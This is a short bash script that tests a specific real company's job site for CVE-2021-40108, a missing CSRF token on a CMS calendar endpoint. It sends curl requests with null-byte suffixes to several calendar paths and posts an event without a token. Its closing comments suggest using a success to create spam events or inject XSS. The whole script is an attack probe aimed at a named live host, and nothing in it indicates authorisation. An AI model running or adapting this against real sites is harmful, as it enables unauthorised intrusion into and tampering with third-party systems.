#!/bin/bash
# CVE-2021-40108: Missing CSRF token on calendar event endpoint
# Severity: Medium
# Affected: < 8.5.6

echo "=== CVE-2021-40108: Testing CSRF on Calendar Event Endpoint ==="

echo -e "\n[1] Checking calendar endpoints..."
curl -s "https://jobs.dnv.com/index.php/ccm/calendar/dialogs/event/add%00" -v
curl -s "https://jobs.dnv.com/index.php/ccm/calendar/dialogs/event/add/save%00" -v

echo -e "\n[2] Checking if calendar is accessible..."
curl -s "https://jobs.dnv.com/index.php/ccm/calendar%00" -v

echo -e "\n[3] Testing calendar API..."
curl -s "https://jobs.dnv.com/index.php/ccm/calendar/event%00" -v

echo -e "\n[4] Attempting to save calendar event WITHOUT token..."
curl -s "https://jobs.dnv.com/index.php/ccm/calendar/dialogs/event/add/save%00" \
    -X POST \
    -d "eventTitle=CSRF Test Event&eventDescription=Test" \
    -v

echo -e "\n[*] If calendar is enabled and accessible without auth:"
echo "    1. Try creating event without ccm_token"
echo "    2. If successful, CSRF vulnerability confirmed"
echo "    3. Could be used to create spam events or inject XSS via event fields"
